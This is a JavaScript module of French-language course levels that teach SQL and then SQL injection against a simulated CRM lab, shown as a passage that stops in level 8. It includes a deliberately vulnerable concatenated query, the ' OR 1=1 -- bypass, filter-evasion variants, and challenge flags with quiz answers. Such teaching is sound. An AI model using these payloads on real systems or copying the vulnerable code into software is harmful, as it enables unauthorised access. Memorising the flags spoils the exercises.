// Curriculum Track 3: SQL & Injections SQL (De Zéro à Pro) - 13 Levels
module.exports = [
  // 1. Qu'est-ce qu'une Base de Données Relationnelle ?
  {
    id: 'm3-l1',
    unitId: 'm3',
    title: "1. Qu'est-ce qu'une Base de Données ?",
    icon: '🗄️',
    xp: 35,
    lessonSlides: [
      {
        title: "Le Cœur de Tout Système Informatique",
        bullets: [
          "Quand tu crées un compte sur un site, quand tu achètes un billet ou quand un hôpital stocke un dossier médical, où vont les données ?",
          "Elles sont stockées dans une **Base de Données Relationnelle** (comme SQLite, MySQL ou PostgreSQL).",
          "Une base de données organise les informations sous forme de **Tables**, comparables à des feuilles de calcul Excel géantes."
        ]
      },
      {
        title: "Tables, Colonnes et Lignes",
        bullets: [
          "Chaque table possède un nom (ex: `crm_customers` pour les clients, `crm_accounts` pour les utilisateurs).",
          "Chaque colonne définit un champ précis : `id`, `company`, `contact_name`, `contract_value`.",
          "Chaque ligne (ou enregistrement) représente une entité unique (ex: un client avec son nom et son contrat)."
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="30" y="20" width="340" height="80" rx="8" fill="#0f172a" stroke="#06b6d4" stroke-width="2"/>
          <text x="45" y="45" fill="#38bdf8" font-size="11" font-family="monospace" font-weight="bold">TABLE : crm_customers</text>
          <line x1="30" y1="55" x2="370" y2="55" stroke="#1e293b" stroke-width="2"/>
          <text x="45" y="75" fill="#94a3b8" font-size="10" font-family="monospace">id | company              | contact_name</text>
          <text x="45" y="90" fill="#34d399" font-size="10" font-family="monospace">1  | CyberDefense Systems | Col. Marc Renoir</text>
        </svg>
      `,
      codeSnippet: {
        language: 'sql',
        lines: [
          { num: 1, text: "-- Définition d'une table relationnelle dans SQLite :" },
          { num: 2, text: "CREATE TABLE crm_customers (", isCritical: true, note: "CREATE TABLE déclare la structure de la table" },
          { num: 3, text: "  id INTEGER PRIMARY KEY," },
          { num: 4, text: "  company TEXT," },
          { num: 5, text: "  contact_name TEXT" },
          { num: 6, text: ");" }
        ],
        prompt: "Clique sur la ligne SQL qui déclare la création de la table :"
      },
      tokenPuzzle: {
        instruction: "Assemble l'instruction pour déclarer la création d'une table SQL :",
        tokens: ["CREATE TABLE", "crm_customers", "SELECT", "DROP"],
        correctOrder: ["CREATE TABLE", "crm_customers"]
      },
      quickQuiz: {
        prompt: "Dans une base de données relationnelle, que représente une 'ligne' (row) dans une table ?",
        options: [
          { text: "Un enregistrement unique contenant toutes les données d'une entité précise (un client, un utilisateur).", isCorrect: true, debrief: "Exact ! Les colonnes définissent les attributs, et chaque ligne est une instance complète." },
          { text: "Le mot de passe de l'administrateur système.", isCorrect: false, debrief: "Faux. Un mot de passe est juste une valeur dans une colonne." },
          { text: "La vitesse de rotation du disque dur.", isCorrect: false, debrief: "Faux. Cela n'a aucun rapport avec le modèle relationnel." },
          { text: "Le câble réseau reliant le serveur au routeur.", isCorrect: false, debrief: "Faux. C'est un concept logiciel et non matériel." }
        ]
      }
    },
    challenge: {
      type: 'crm_target',
      instructions: "Dans l'interface CRM Aegis ci-dessous, recherche le nom de contact 'Renoir' dans la barre de recherche. Soumets la raison sociale de l'entreprise cliente affichée !",
      flag: 'CyberDefense Systems'
    }
  },

  // 2. Le Langage SQL : Lire avec SELECT
  {
    id: 'm3-l2',
    unitId: 'm3',
    title: "2. Le Langage SQL : Lire avec SELECT",
    icon: '🔎',
    xp: 35,
    lessonSlides: [
      {
        title: "Parler à la Base : Le Langage SQL",
        bullets: [
          "Pour poser des questions à une base de données, les développeurs utilisent un langage standardisé créé dans les années 1970 : le **SQL** (Structured Query Language).",
          "C'est un langage déclaratif très proche de l'anglais naturel : tu dis *ce que tu veux*, et le moteur de base de données se charge de le trouver."
        ]
      },
      {
        title: "L'Ordre Fondamental : SELECT ... FROM ...",
        bullets: [
          "`SELECT` indique quelles colonnes tu veux afficher.",
          "L'étoile `*` est un joker signifiant **TOUTES les colonnes** sans exception.",
          "`FROM` indique dans quelle table chercher.",
          "Exemple : `SELECT * FROM crm_customers;` ordonne à la base d'afficher l'intégralité de la table des clients !"
        ],
        syntaxBox: {
          command: "SELECT company, contract_value FROM crm_customers;",
          description: "Extrait uniquement le nom de l'entreprise et la valeur du contrat pour tous les clients.",
          example: "CyberDefense Systems | 4500000.00"
        }
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="30" y="30" width="130" height="60" rx="8" fill="#0f172a" stroke="#06b6d4" stroke-width="2"/>
          <text x="95" y="55" fill="#38bdf8" font-size="11" font-family="monospace" text-anchor="middle" font-weight="bold">SELECT *</text>
          <text x="95" y="75" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Prendre toutes colonnes</text>
          <path d="M 170 60 L 220 60" stroke="#10b981" stroke-width="2"/>
          <rect x="230" y="30" width="140" height="60" rx="8" fill="#0f172a" stroke="#10b981" stroke-width="2"/>
          <text x="300" y="55" fill="#34d399" font-size="11" font-family="monospace" text-anchor="middle" font-weight="bold">FROM clients</text>
          <text x="300" y="75" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Depuis la table clients</text>
        </svg>
      `,
      codeSnippet: {
        language: 'sql',
        lines: [
          { num: 1, text: "-- Interroge la table pour lire toutes les colonnes :" },
          { num: 2, text: "SELECT * FROM crm_customers;", isCritical: true, note: "SELECT * extrait toutes les colonnes de la table crm_customers" },
          { num: 3, text: "-- Renvoie toutes les lignes de la table" }
        ],
        prompt: "Clique sur la requête SQL qui extrait toutes les colonnes :"
      },
      tokenPuzzle: {
        instruction: "Construis la requête SQL universelle pour lire la table crm_customers :",
        tokens: ["SELECT *", "FROM crm_customers;", "WHERE", "DROP"],
        correctOrder: ["SELECT *", "FROM crm_customers;"]
      },
      quickQuiz: {
        prompt: "Que signifie le symbole astérisque '*' placé immédiatement après le mot-clé SQL 'SELECT' ?",
        options: [
          { text: "Sélectionner l'intégralité de toutes les colonnes disponibles dans la table ciblée.", isCorrect: true, debrief: "Exact ! L'astérisque est un métacaractère qui évite d'avoir à lister toutes les colonnes une par une." },
          { text: "Multiplier les valeurs numériques par deux.", isCorrect: false, debrief: "Faux. Dans SELECT *, il n'y a aucune opération de multiplication arithmétique." },
          { text: "Chiffrer le résultat avec un mot de passe.", isCorrect: false, debrief: "Faux. SQL ne chiffre pas les données via SELECT *." },
          { text: "Supprimer les lignes contenant des erreurs.", isCorrect: false, debrief: "Faux. SELECT ne supprime jamais rien, il lit seulement." }
        ]
      }
    },
    challenge: {
      type: 'crm_target',
      instructions: "Dans le CRM Aegis, tape 'Defense' dans la barre de recherche pour retrouver le contrat de la société cliente. Soumets le nom complet de l'entreprise !",
      flag: 'CyberDefense Systems'
    }
  },

  // 3. Filtrer avec WHERE et Opérateurs
  {
    id: 'm3-l3',
    unitId: 'm3',
    title: "3. Filtrer Précisément avec WHERE",
    icon: '🎯',
    xp: 35,
    lessonSlides: [
      {
        title: "La Clause WHERE : Trouver l'Aiguille",
        bullets: [
          "Si une base contient 10 millions d'utilisateurs, exécuter `SELECT * FROM users;` ferait planter le serveur !",
          "On utilise la clause de filtrage **WHERE** (où) pour n'extraire que les lignes satisfaisant une condition précise.",
          "Exemple : `SELECT * FROM users WHERE username = 'admin';`."
        ]
      },
      {
        title: "Les Opérateurs de Comparaison SQL",
        bullets: [
          "• `=` : égalité stricte (`role = 'admin'`).",
          "• `!=` ou `<>` : différent de (`status != 'banned'`).",
          "• `>`, `<` : comparaisons numériques (`contract_value > 1000000`).",
          "• `LIKE '%terme%'` : recherche partielle (contient le terme n'importe où).",
          "• `AND` / `OR` : combine plusieurs conditions logiques !"
        ],
        syntaxBox: {
          command: "SELECT * FROM crm_customers WHERE company LIKE '%Global%';",
          description: "Ne sélectionne que les clients dont le nom d'entreprise contient le mot 'Global'.",
          example: "2 | Global Satellite Link | Sarah Jenkins"
        }
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="20" y="30" width="100" height="60" rx="8" fill="#0f172a" stroke="#06b6d4" stroke-width="2"/>
          <text x="70" y="65" fill="#38bdf8" font-size="11" font-family="monospace" text-anchor="middle">SELECT *</text>
          <rect x="135" y="30" width="100" height="60" rx="8" fill="#0f172a" stroke="#3b82f6" stroke-width="2"/>
          <text x="185" y="65" fill="#60a5fa" font-size="11" font-family="monospace" text-anchor="middle">FROM clients</text>
          <rect x="250" y="30" width="130" height="60" rx="8" fill="#0f172a" stroke="#f59e0b" stroke-width="2"/>
          <text x="315" y="55" fill="#fbbf24" font-size="10" font-family="monospace" text-anchor="middle">WHERE</text>
          <text x="315" y="75" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">id = 2</text>
        </svg>
      `,
      codeSnippet: {
        language: 'sql',
        lines: [
          { num: 1, text: "-- Filtre pour extraire uniquement la société satellite :" },
          { num: 2, text: "SELECT * FROM crm_customers WHERE company LIKE '%Global%';", isCritical: true, note: "WHERE applique la condition de filtrage spécifique" },
          { num: 3, text: "2 | Global Satellite Link | Sarah Jenkins" }
        ],
        prompt: "Clique sur la requête SQL contenant la clause de filtrage WHERE :"
      },
      tokenPuzzle: {
        instruction: "Assemble la requête SQL pour filtrer les comptes dont le rôle est 'Administrator' :",
        tokens: ["SELECT * FROM crm_accounts", "WHERE role = 'Administrator';", "ORDER BY", "DROP"],
        correctOrder: ["SELECT * FROM crm_accounts", "WHERE role = 'Administrator';"]
      },
      quickQuiz: {
        prompt: "Quel mot-clé SQL permet de poser une condition stricte pour ne retourner que les lignes correspondantes ?",
        options: [
          { text: "WHERE (permet de définir les critères booléens de filtrage).", isCorrect: true, debrief: "Exact ! WHERE teste chaque ligne et ne garde que celles dont la condition est vraie (TRUE)." },
          { text: "GROUP BY (regroupe les résultats).", isCorrect: false, debrief: "Faux. GROUP BY sert aux fonctions d'agrégation (SUM, COUNT)." },
          { text: "ORDER BY (trie les résultats).", isCorrect: false, debrief: "Faux. ORDER BY sert à trier par ordre croissant ou décroissant." },
          { text: "HAVING (filtre sur les agrégats).", isCorrect: false, debrief: "Faux. HAVING filtre après regroupement, WHERE filtre les lignes individuelles." }
        ]
      }
    },
    challenge: {
      type: 'crm_target',
      instructions: "Dans le CRM Aegis, recherche 'Global' pour identifier le contrat de communication satellite. Soumets le nom exact de la société trouvée !",
      flag: 'Global Satellite Link'
    }
  },

  // 4. Manipuler les Données : INSERT, UPDATE, DELETE
  {
    id: 'm3-l4',
    unitId: 'm3',
    title: "4. Modifier les Données : INSERT & UPDATE",
    icon: '📝',
    xp: 35,
    lessonSlides: [
      {
        title: "Au-delà de la Lecture : Modifier la Base",
        bullets: [
          "`SELECT` ne fait que lire sans jamais rien altérer.",
          "Pour créer de nouvelles données, les développeurs utilisent `INSERT INTO`.",
          "Pour modifier un enregistrement existant, on utilise `UPDATE` combiné à `WHERE`.",
          "Pour supprimer une ligne, on utilise `DELETE FROM table WHERE ...`."
        ]
      },
      {
        title: "Le Danger Absolu du UPDATE sans WHERE",
        bullets: [
          "Si un développeur écrit par inadvertance `UPDATE users SET role = 'admin';` sans mettre de clause `WHERE`, **TOUS** les utilisateurs de la base deviennent administrateurs en un instant !",
          "C'est pourquoi comprendre la syntaxe SQL exacte est capital pour tout expert en sécurité."
        ],
        syntaxBox: {
          command: "UPDATE users SET role = 'admin' WHERE id = 42;",
          description: "Modifie le rôle uniquement pour l'utilisateur dont l'identifiant est 42.",
          example: "1 ligne mise à jour."
        }
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="30" width="100" height="60" rx="8" fill="#0f172a" stroke="#06b6d4" stroke-width="2"/>
          <text x="75" y="55" fill="#38bdf8" font-size="11" font-family="monospace" text-anchor="middle" font-weight="bold">INSERT</text>
          <text x="75" y="75" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Créer ligne</text>
          <rect x="150" y="30" width="100" height="60" rx="8" fill="#0f172a" stroke="#10b981" stroke-width="2"/>
          <text x="200" y="55" fill="#34d399" font-size="11" font-family="monospace" text-anchor="middle" font-weight="bold">UPDATE</text>
          <text x="200" y="75" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Modifier ligne</text>
          <rect x="275" y="30" width="100" height="60" rx="8" fill="#0f172a" stroke="#f43f5e" stroke-width="2"/>
          <text x="325" y="55" fill="#f87171" font-size="11" font-family="monospace" text-anchor="middle" font-weight="bold">DELETE</text>
          <text x="325" y="75" fill="#94a3b8" font-size="9" font-family="monospace" text-anchor="middle">Supprimer ligne</text>
        </svg>
      `,
      codeSnippet: {
        language: 'sql',
        lines: [
          { num: 1, text: "-- Met à jour le rôle de l'utilisateur 42 :" },
          { num: 2, text: "UPDATE crm_accounts SET role = 'Administrator' WHERE id = 42;", isCritical: true, note: "UPDATE modifie les valeurs de colonnes pour les lignes sélectionnées" },
          { num: 3, text: "-- 1 row updated" }
        ],
        prompt: "Clique sur la requête SQL qui modifie une valeur en base :"
      },
      tokenPuzzle: {
        instruction: "Construis l'instruction SQL pour mettre à jour le rôle :",
        tokens: ["UPDATE crm_accounts", "SET role = 'Administrator'", "WHERE id = 42;", "DROP"],
        correctOrder: ["UPDATE crm_accounts", "SET role = 'Administrator'", "WHERE id = 42;"]
      },
      quickQuiz: {
        prompt: "Que se passe-t-il si un administrateur exécute 'UPDATE users SET role = 'admin';' sans clause WHERE ?",
        options: [
          { text: "Toutes les lignes de la table sans exception voient leur rôle modifié en 'admin'.", isCorrect: true, debrief: "Exactement ! Sans clause WHERE, UPDATE s'applique aveuglément à toute la table." },
          { text: "La base de données refuse l'ordre et affiche une erreur de syntaxe.", isCorrect: false, debrief: "Faux. En SQL standard, un UPDATE sans WHERE est parfaitement valide et dévastateur." },
          { text: "Seul le premier utilisateur créé est modifié.", isCorrect: false, debrief: "Faux. C'est toute la table qui est affectée." },
          { text: "La table est automatiquement supprimée.", isCorrect: false, debrief: "Faux. Pour supprimer une table, on utilise DROP TABLE." }
        ]
      }
    },
    challenge: {
      type: 'crm_target',
      instructions: "Dans le CRM Aegis, recherche 'Quantum' pour trouver le projet classifié de nanotechnologie. Soumets la raison sociale de l'entreprise !",
      flag: 'Quantum Nanotech Corp'
    }
  },

  // 5. Concaténation Vulnérable vs Requêtes Préparées
  {
    id: 'm3-l5',
    unitId: 'm3',
    title: "5. Comment Naît la Faille : Concaténation",
    icon: '⚡',
    xp: 40,
    lessonSlides: [
      {
        title: "La Faute Originelle : Coller du Texte",
        bullets: [
          "Une injection SQL ne vient **JAMAIS** d'un bug de la base de données. Elle vient TOUJOURS d'une erreur d'écriture dans le code serveur (Node.js, PHP, Python, Java).",
          "Quand un utilisateur tape son pseudo dans un formulaire, comment le serveur fabrique-t-il la requête SQL ?",
          "Si le développeur assemble la chaîne par une bête concaténation de texte : `query = \"SELECT * FROM users WHERE user = '\" + userInput + \"';\"`, la porte de l'enfer est ouverte !"
        ]
      },
      {
        title: "La Confusion Code vs Données",
        bullets: [
          "Dans un système sain, les données de l'utilisateur doivent rester de **simples données passives**.",
          "Mais avec la concaténation, si l'attaquant tape des caractères réservés du langage SQL (comme le guillemet `'`), le moteur de base de données les interprète comme de **nouvelles instructions de code exécutable** !"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="20" width="350" height="80" rx="8" fill="#030712" stroke="#f43f5e" stroke-width="2"/>
          <text x="35" y="45" fill="#f87171" font-size="11" font-family="monospace">CODE VULNÉRABLE (Concaténation) :</text>
          <text x="35" y="70" fill="#94a3b8" font-size="11" font-family="monospace">"SELECT * FROM users WHERE name = '" + <tspan fill="#f59e0b" font-weight="bold">userInput</tspan> + "'"</text>
          <text x="35" y="88" fill="#38bdf8" font-size="9" font-family="monospace">Si userInput contient ' ➔ la chaîne SQL est brisée !</text>
        </svg>
      `,
      codeSnippet: {
        language: 'javascript',
        lines: [
          { num: 1, text: "// ❌ CODE BACKEND FAUTIF (Concaténation de chaîne non assainie) :" },
          { num: 2, text: "const sql = `SELECT * FROM crm_customers WHERE company LIKE '%${req.query.search}%'`;", isCritical: true, note: "La concaténation directe de req.query.search permet à l'attaquant d'injecter du SQL" },
          { num: 3, text: "const results = db.prepare(sql).all();" }
        ],
        prompt: "Clique sur la ligne de code backend contenant la vulnérabilité de concaténation :"
      },
      tokenPuzzle: {
        instruction: "Assemble le fragment vulnérable montrant la concaténation de paramètres :",
        tokens: ["WHERE company LIKE '%", "${req.query.search}", "%'", "db.prepare(?)"],
        correctOrder: ["WHERE company LIKE '%", "${req.query.search}", "%'"]
      },
      quickQuiz: {
        prompt: "Quelle est la cause fondamentale de l'apparition d'une faille par injection SQL dans une application web ?",
        options: [
          { text: "L'assemblage direct d'entrées utilisateur brutes dans la syntaxe de la requête SQL sans requêtes préparées.", isCorrect: true, debrief: "Exact ! Le moteur SQL confond alors les données utilisateur avec des commandes du langage." },
          { text: "L'utilisation d'un mot de passe trop court pour la base de données.", isCorrect: false, debrief: "Faux. Même avec un mot de passe de 100 caractères, la faille reste exploitable." },
          { text: "L'absence de connexion Internet sur le serveur.", isCorrect: false, debrief: "Faux. La faille existe localement dès que le serveur traite une entrée." },
          { text: "Le fait que le disque dur soit formaté en NTFS.", isCorrect: false, debrief: "Faux. Le système de fichiers n'a aucun lien avec la logique applicative SQL." }
        ]
      }
    },
    challenge: {
      type: 'crm_target',
      instructions: "Dans le CRM Aegis, tape un simple guillemet simple ' dans la barre de recherche. Observe la boîte d'alerte rouge et soumets le message d'erreur SQL affiché (Database Query Error) !",
      flag: 'Database Query Error'
    }
  },

  // 6. L'Anatomie d'une Faille SQL : L'Erreur du Guillemet
  {
    id: 'm3-l6',
    unitId: 'm3',
    title: "6. L'Erreur du Guillemet Simple (')",
    icon: '⚡',
    xp: 40,
    lessonSlides: [
      {
        title: "La Sonde Numéro 1 du Pentesteur : Le Guillemet",
        bullets: [
          "Quand un hacker éthique teste un champ de saisie (barre de recherche, formulaire de login, paramètre d'URL `?id=1`), quel est son tout premier réflexe ?",
          "Taper un simple **guillemet droit** : `'`.",
          "Pourquoi ? Parce qu'en SQL, les chaînes de texte sont délimitées par des paires de guillemets : `'mon_texte'`."
        ]
      },
      {
        title: "Provoquer une Erreur de Syntaxe",
        bullets: [
          "Si le développeur a écrit : `SELECT * FROM clients WHERE nom = 'ENTREE_UTILISATEUR';`",
          "Et que tu injectes `'`, la requête devient : `SELECT * FROM clients WHERE nom = ''';`.",
          "Il y a maintenant **3 guillemets** ! Le moteur SQL ne sait plus où s'arrête la chaîne et génère un crash : **Syntax Error / Unclosed quotation mark**.",
          "Si cette erreur apparaît à l'écran, félicitations : tu viens de prouver que l'application est vulnérable à l'injection SQL !"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="25" width="350" height="70" rx="8" fill="#030712" stroke="#f43f5e" stroke-width="2"/>
          <text x="40" y="50" fill="#f87171" font-size="11" font-family="monospace" font-weight="bold">ANALYSE DU CRASH SYNTAXIQUE :</text>
          <text x="40" y="70" fill="#94a3b8" font-size="11" font-family="monospace">WHERE company LIKE '%<tspan fill="#f59e0b" font-weight="bold">'</tspan>%' ➔ 3 guillemets impairs !</text>
          <text x="40" y="85" fill="#f43f5e" font-size="9" font-family="monospace">Moteur SQLite : "unrecognized token" (Erreur 500)</text>
        </svg>
      `,
      codeSnippet: {
        language: 'sql',
        lines: [
          { num: 1, text: "-- La requête brisée par l'injection d'un simple guillemet :" },
          { num: 2, text: "SELECT * FROM crm_customers WHERE company LIKE '%'%';", isCritical: true, note: "Le 3ème guillemet casse la clôture de chaîne et déclenche une erreur de syntaxe" },
          { num: 3, text: "-- Résultat : SQLite error: unrecognized token" }
        ],
        prompt: "Clique sur la requête SQL dont la syntaxe est rompue par le guillemet :"
      },
      tokenPuzzle: {
        instruction: "Tape la sonde minimale universelle pour tester la présence d'une injection SQL :",
        tokens: ["'", "\"", "--", "SELECT"],
        correctOrder: ["'"]
      },
      quickQuiz: {
        prompt: "Pourquoi l'injection d'un guillemet simple (') déclenche-t-elle souvent une erreur 500 dans une application vulnérable ?",
        options: [
          { text: "Parce qu'il crée un nombre impair de guillemets, brisant la clôture de la chaîne textuelle attendue par l'analyseur SQL.", isCorrect: true, debrief: "Exact ! L'analyseur lexical (parser) rencontre une chaîne non fermée et lève une exception non gérée." },
          { text: "Parce que le guillemet est un caractère interdit par le protocole TCP.", isCorrect: false, debrief: "Faux. TCP transporte tous les octets ASCII sans distinction." },
          { text: "Parce qu'il surcharge la mémoire vive de l'ordinateur de l'utilisateur.", isCorrect: false, debrief: "Faux. Un guillemet pèse 1 seul octet." },
          { text: "Parce qu'il envoie un signal d'extinction au serveur web.", isCorrect: false, debrief: "Faux. C'est une erreur de parsing syntaxique SQL." }
        ]
      }
    },
    challenge: {
      type: 'crm_target',
      instructions: "Dans le CRM Aegis, teste la sonde ' dans la recherche pour forcer le crash du moteur SQLite. Soumets le texte d'erreur affiché (Database Query Error) !",
      flag: 'Database Query Error'
    }
  },

  // 7. Le Bypass d'Authentification Classique : ' OR 1=1 --
  {
    id: 'm3-l7',
    unitId: 'm3',
    title: "7. Le Bypass d'Auth : ' OR 1=1 --",
    icon: '🔓',
    xp: 45,
    lessonSlides: [
      {
        title: "La Charge Utile la Plus Célèbre du Monde",
        bullets: [
          "Après avoir prouvé qu'un guillemet brise la requête, l'attaquant veut en reprendre le contrôle.",
          "Pour cela, il injecte le payload légendaire : `' OR 1=1 --`.",
          "Décortiquons chirurgicalement chacun de ces 4 fragments :"
        ]
      },
      {
        title: "Anatomie du ' OR 1=1 --",
        bullets: [
          "1. `'` : ferme proprement la chaîne textuelle ouverte par le développeur.",
          "2. `OR` : opérateur logique (la condition globale sera vraie si au moins UNE des conditions est vraie).",
          "3. `1=1` : une vérité mathématique absolue qui est **TOUJOURS VRAIE** (TRUE).",
          "4. `-- ` : le symbole de commentaire SQL qui ordonne au moteur d'**ignorer et jeter à la poubelle** tout le reste de la requête d'origine (comme la vérification du mot de passe) !"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="20" width="350" height="80" rx="8" fill="#030712" stroke="#10b981" stroke-width="2"/>
          <text x="35" y="45" fill="#34d399" font-size="11" font-family="monospace">REQUÊTE DÉTOURNÉE PAR L'ATTAQUANT :</text>
          <text x="35" y="65" fill="#94a3b8" font-size="11" font-family="monospace">WHERE user = '<tspan fill="#38bdf8">'</tspan> <tspan fill="#fbbf24">OR 1=1</tspan> <tspan fill="#f43f5e">-- ' AND pass = '...'</tspan></text>
          <text x="35" y="85" fill="#10b981" font-size="10" font-family="monospace">1=1 est toujours VRAI ➔ Authentification contournée !</text>
        </svg>
      `,
      codeSnippet: {
        language: 'sql',
        lines: [
          { num: 1, text: "-- Requête finale interprétée par la base de données :" },
          { num: 2, text: "SELECT * FROM users WHERE user = '' OR 1=1 --' AND pass = '...';", isCritical: true, note: "' OR 1=1 rend la condition toujours vraie, et -- neutralise la vérification du mot de passe" },
          { num: 3, text: "-- La base connecte l'attaquant sur le premier compte (généralement admin)" }
        ],
        prompt: "Clique sur la requête qui contient l'injection booléenne ' OR 1=1 -- :"
      },
      tokenPuzzle: {
        instruction: "Reconstitue dans l'ordre le payload de bypass d'authentification universel :",
        tokens: ["'", "OR", "1=1", "--"],
        correctOrder: ["'", "OR", "1=1", "--"]
      },
      quickQuiz: {
        prompt: "Quel est le rôle exact des deux tirets '--' à la fin du payload d'injection SQL sous SQLite / MySQL ?",
        options: [
          { text: "Indiquer le début d'un commentaire SQL, forçant le moteur à ignorer la fin de la requête originale.", isCorrect: true, debrief: "Exact ! Tout ce qui suit les deux tirets (dont le mot de passe prévu) est ignoré par l'analyseur." },
          { text: "Décrémenter la valeur de la variable de session.", isCorrect: false, debrief: "Faux. En SQL, la décrémentation n'utilise pas la syntaxe -- de cette façon." },
          { text: "Redémarrer le serveur de base de données en mode sans échec.", isCorrect: false, debrief: "Faux. -- est un simple commentaire de syntaxe." },
          { text: "Créer un tunnel VPN chiffré vers l'attaquant.", isCorrect: false, debrief: "Faux. Le SQL n'ouvre pas de tunnels VPN." }
        ]
      }
    },
    challenge: {
      type: 'crm_target',
      instructions: "Dans le CRM Aegis, injecte la charge utile booléenne universelle ' OR 1=1 -- dans la recherche pour forcer la sortie de tous les enregistrements. Soumets le drapeau FLAG{...} révélé dans le mémo confidentiel !",
      flag: 'FLAG{SQLI_UNION_EXTRACTED_CRM_DATA}'
    }
  },

  // ★ CHECKPOINT ÉVALUATION MI-PARCOURS TRACK 3 ★
  {
    id: 'm3-mid',
    unitId: 'm3',
    title: "ÉVALUATION MI-PARCOURS : INFILTRATION DU CRM CONFIDENTIEL",
    icon: '🛡️',
    isCheckpoint: true,
    xp: 75,
    lessonSlides: [
      {
        title: "PENTEST BDD : Dossier Stratégique Classifié ShadowVault",
        bullets: [
          "Le conseil d'administration d'Aegis Defense utilise ce CRM pour stocker les contrats confidentiels les plus sensibles.",
          "Un client VIP classifié 'ShadowVault' a été enregistré dans la base de données. Il est invisible lors d'une recherche classique.",
          "Cette épreuve récapitule : requêtes relationnelles, opérateurs logiques WHERE, bris de guillemets et neutralisation des filtres SQL."
        ]
      },
      {
        title: "Mission d'Infiltration (Sans Guidage)",
        bullets: [
          "1. Ouvre l'interface de recherche du CRM d'entreprise ci-dessous.",
          "2. Analyse la logique SQL sous-jacente et exploite la vulnérabilité sans aucune aide assistée.",
          "3. Force le moteur de base de données à déverser tous les comptes confidentiels et soumets le FLAG du dossier VIP !"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 500 130" class="w-full h-full">
          <rect width="500" height="130" rx="12" fill="#0f172a" stroke="#f59e0b" stroke-width="2"/>
          <circle cx="65" cy="65" r="32" fill="#f59e0b" fill-opacity="0.15" stroke="#f59e0b" stroke-width="2"/>
          <text x="65" y="74" fill="#f59e0b" font-size="28" text-anchor="middle">🛡️</text>
          <text x="120" y="45" fill="#f8fafc" font-size="14" font-family="monospace" font-weight="bold">CHECKPOINT INFILTRATION BDD CRM</text>
          <text x="120" y="70" fill="#94a3b8" font-size="11" font-family="monospace">Cible : Base SQLite / crm_customers [VIP Vault]</text>
          <rect x="120" y="85" width="350" height="26" rx="6" fill="#1e293b" stroke="#334155"/>
          <text x="130" y="102" fill="#f59e0b" font-size="11" font-family="monospace">Objectif : Extraire le mémo classifié du Général</text>
        </svg>
      `,
      codeSnippet: {
        language: 'sql',
        lines: [
          { num: 1, text: "-- Injection d'évasion booléenne sur le moteur de recherche CRM :" },
          { num: 2, text: "SELECT * FROM crm_customers WHERE company LIKE '%' OR 1=1 -- %'", isCritical: true, note: "La condition OR 1=1 force la clause WHERE à évaluer TOUTES les lignes comme vraies" },
          { num: 3, text: "-- Sortie : Affichage de l'enregistrement VIP classifié ShadowVault" }
        ],
        prompt: "Clique sur la condition logique qui force la restitution de 100% des lignes classifiées :"
      },
      tokenPuzzle: {
        instruction: "Reconstitue la charge d'injection pour faire tomber le filtre du CRM :",
        tokens: ["'", "OR", "1=1", "--", "SELECT"],
        correctOrder: ["'", "OR", "1=1", "--"]
      },
      quickQuiz: {
        prompt: "Dans l'expression 'OR 1=1', pourquoi la condition WHERE devient-elle inconditionnellement vraie pour chaque enregistrement ?",
        options: [
          { text: "Parce que 1=1 est une tautologie mathématique toujours vraie, et que l'opérateur OR suffit à valider toute la clause.", isCorrect: true, debrief: "Exactement ! En logique booléenne, (Faux OU Vrai) donne toujours Vrai." },
          { text: "Parce que le chiffre 1 active le compte administrateur par défaut dans SQLite.", isCorrect: false, debrief: "Faux. 1=1 est une simple comparaison mathématique universelle." },
          { text: "Parce que la base de données est immédiatement réinitialisée en mode usine.", isCorrect: false, debrief: "Faux. Aucune donnée n'est altérée par une injection en SELECT." },
          { text: "Parce que 1=1 est une commande secrète réservée aux développeurs du moteur.", isCorrect: false, debrief: "Faux. C'est de l'arithmétique pure exécutée par le moteur SQL." }
        ]
      }
    },
    challenge: {
      type: 'crm_target',
      instructions: "Dans le CRM Aegis, exploite la faille d'injection SQL sans assistance pour forcer l'affichage du dossier classifié 'ShadowVault Classified (VIP)'. Soumets la valeur du FLAG VIP révélé !",
      flag: 'FLAG{SQL_MID_EVAL_CRM_UNLOCKED_8821}'
    }
  },

  // 8. Variantes de Bypass et Commentaires
  {
    id: 'm3-l8',
    unitId: 'm3',
    title: "8. Variantes de Bypass & Commentaires",
    icon: '🔀',
    xp: 45,
    lessonSlides: [
      {
        title: "Tous les Systèmes ne Sont Pas Identiques",
        bullets: [
          "Si un pare-feu applicatif (WAF) bloque l'expression `1=1` ou si le moteur n'est pas SQLite, comment adapter son attaque ?",
          "Un pentesteur professionnel doit maîtriser les variantes syntaxiques :"
        ]
      },
      {
        title: "Les Variantes Majeures",
        bullets: [
          "• **Égalités alternatives** : `' OR 'a'='a` ou `' OR 2>1` (pas de chiffres `1=1` évidents).",
          "• **Commentaires MySQL** : le dièse `#` est souvent utilisé à la place de `-- `.",
          "• **Commentaires multi-lignes** : `/* commentaire */` utile pour contourner les filtres d'espaces.",
          "• **Bypass avec fermeture propre** : `' OR '1'='1` ne nécessite même aucun commentaire car il referme le guillemet final tout seul !"
        ]
      }
    ],
    microCard: {
      svgVisual: `
        <svg viewBox="0 0 400 120" class="w-full h-full">
          <rect x="25" y="25" width="165" height="70" rx="8" fill="#0f172a" stroke="#06b6d4" stroke-width="2"/>
          <text x="107" y="50" fill="#38bdf8" font-size="11" font-family="monospace" text-anchor="middle" font-weight="bold">-- commentaire</text>
